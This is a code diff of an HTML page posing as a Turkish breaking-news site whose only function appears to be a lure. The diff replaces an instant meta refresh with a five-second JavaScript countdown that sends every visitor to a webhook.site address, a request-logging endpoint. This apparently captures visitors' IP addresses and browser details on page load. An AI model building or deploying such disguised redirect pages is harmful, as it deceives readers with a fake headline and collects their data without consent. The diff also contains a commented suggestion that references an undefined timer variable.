@@ -4,7 +4,6 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SON DAKİKA HABER</title>
-  <meta http-equiv="refresh" content="0; url=https://webhook.site/64e79efb-be4e-425c-aa6d-ef8b35d2d2c8">
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -58,6 +57,11 @@
       margin-bottom: 20px;
       border-radius: 5px;
     }
+    .countdown {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #7f8c8d;
+    }
   </style>
 </head>
 <body>
@@ -70,10 +74,37 @@
     <div class="breaking-news">MOBBİNG BİR KİŞİYİ DAHA CANINDAN ETTİ</div>
 
     <div class="loading">
-      <h2>⏳ YÜKLENİYOR.</h2>
+      <h2>⏳ YÜKLENİYOR...</h2>
       <div class="spinner"></div>
       <p>EN GÜNCEL HABERLER.</p>
+      <div class="countdown" id="countdown">Yönlendiriliyor: 5 saniye kaldı</div>
     </div>
   </div>
+
+  <script>
+    // Yönlendirme süresi (milisaniye cinsinden)
+    const redirectTime = 5000; // 5 saniye
+    
+    // Geri sayımı göstermek için
+    let timeLeft = redirectTime / 1000;
+    const countdownElement = document.getElementById('countdown');
+    
+    const countdownInterval = setInterval(() => {
+      timeLeft--;
+      countdownElement.textContent = `Yönlendiriliyor: ${timeLeft} saniye kaldı`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(countdownInterval);
+      }
+    }, 1000);
+    
+    // Belirtilen süre sonra yönlendirme yap
+    setTimeout(() => {
+      window.location.href = "https://webhook.site/64e79efb-be4e-425c-aa6d-ef8b35d2d2c8";
+    }, redirectTime);
+    
+    // Kullanıcı yönlendirmeyi iptal edebilsin diye bir buton ekleyebilirsiniz
+    // Örnek: document.getElementById('cancelBtn').addEventListener('click', () => clearTimeout(redirectTimer));
+  </script>
 </body>
 </html>
